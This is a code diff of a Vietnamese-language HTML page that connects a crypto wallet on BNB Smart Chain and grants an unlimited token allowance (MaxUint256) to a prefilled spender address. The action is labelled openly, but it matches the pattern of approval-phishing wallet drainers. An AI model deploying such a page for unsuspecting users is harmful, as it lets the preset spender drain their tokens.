@@ -3,24 +3,66 @@
 <head>
   <meta charset="UTF-8" />
   <title>Approve BSC Token Unlimited</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
   <script src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      padding: 16px;
+    }
+    .container {
+      max-width: 480px;
+      margin: auto;
+      background: white;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    label {
+      margin-top: 14px;
+      display: block;
+    }
+    button {
+      background-color: #0a8754;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #ccc;
+    }
+    #status {
+      font-size: 14px;
+      margin-top: 12px;
+      color: #333;
+      word-break: break-all;
+    }
+  </style>
 </head>
 <body>
-  <h2>Connect Wallet (BSC + QR Supported)</h2>
-  <div id="status">Not connected</div>
-  <button id="connectButton">Connect Wallet</button>
+  <div class="container">
+    <h2>🔗 BSC Token Approve</h2>
+    <div id="status">🔌 Chưa kết nối</div>
+    <button id="connectButton">Kết nối ví</button>
 
-  <h3>Unlimited Approve</h3>
+    <label for="spenderAddress">Spender Address:</label>
+    <input type="text" id="spenderAddress" value="0xb300000b72DEAEb607a12d5f54773D1C19c7028d" />
 
-  <label>Spender Address:</label><br />
-  <input type="text" id="spenderAddress" value="0xb300000b72DEAEb607a12d5f54773D1C19c7028d" style="width: 400px;" /><br /><br />
+    <label for="tokenAddress">Token Address:</label>
+    <input type="text" id="tokenAddress" value="0x7e975D85714B11d862C7cFFEe3C88d565a139Eb7" />
 
-  <label>Token Address:</label><br />
-  <input type="text" id="tokenAddress" value="0x7e975D85714B11d862C7cFFEe3C88d565a139Eb7" style="width: 400px;" /><br /><br />
-
-  <button id="approveButton" disabled>Approve Unlimited</button>
+    <button id="approveButton" disabled>✅ Approve Unlimited</button>
+  </div>
 
   <script>
     let signer;
@@ -72,18 +114,16 @@
         const instance = await web3Modal.connect();
         provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
-        const network = await provider.getNetwork();
 
-        if (network.chainId !== 56) {
-          await switchToBSC();
-        }
+        const network = await provider.getNetwork();
+        if (network.chainId !== 56) await switchToBSC();
 
         const address = await signer.getAddress();
-        document.getElementById("status").innerText = "Connected: " + address;
+        document.getElementById("status").innerText = "✅ Đã kết nối: " + address;
         document.getElementById("approveButton").disabled = false;
       } catch (err) {
-        console.error("Connection failed", err);
-        document.getElementById("status").innerText = "Connection failed: " + err.message;
+        document.getElementById("status").innerText = "❌ Kết nối lỗi: " + err.message;
+        console.error(err);
       }
     }
 
@@ -91,32 +131,18 @@
       try {
         const spender = document.getElementById("spenderAddress").value.trim();
         const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        if (!spender || !ethers.utils.isAddress(spender)) return alert("Spender không hợp lệ!");
+        if (!tokenAddress || !ethers.utils.isAddress(tokenAddress)) return alert("Token address không hợp lệ!");
 
-        if (!spender || !ethers.utils.isAddress(spender)) {
-          alert("Invalid spender address");
-          return;
-        }
-
-        if (!tokenAddress || !ethers.utils.isAddress(tokenAddress)) {
-          alert("Invalid token address");
-          return;
-        }
-
-        const tokenAbi = [
-          "function approve(address spender, uint256 amount) public returns (bool)",
-        ];
-
-        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
-        const amount = ethers.constants.MaxUint256;
-
-        document.getElementById("status").innerText = "Approving unlimited...";
-        const tx = await tokenContract.approve(spender, amount);
+        const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+        const token = new ethers.Contract(tokenAddress, abi, signer);
+        const tx = await token.approve(spender, ethers.constants.MaxUint256);
+        document.getElementById("status").innerText = "📝 Đang gửi giao dịch...";
         await tx.wait();
-
-        document.getElementById("status").innerText = "Approval success! Tx: " + tx.hash;
+        document.getElementById("status").innerText = "✅ Đã Approve thành công! Tx: " + tx.hash;
       } catch (err) {
-        console.error("Approval failed", err);
-        document.getElementById("status").innerText = "Approval failed: " + err.message;
+        console.error(err);
+        document.getElementById("status").innerText = "❌ Approve lỗi: " + err.message;
       }
     }
 
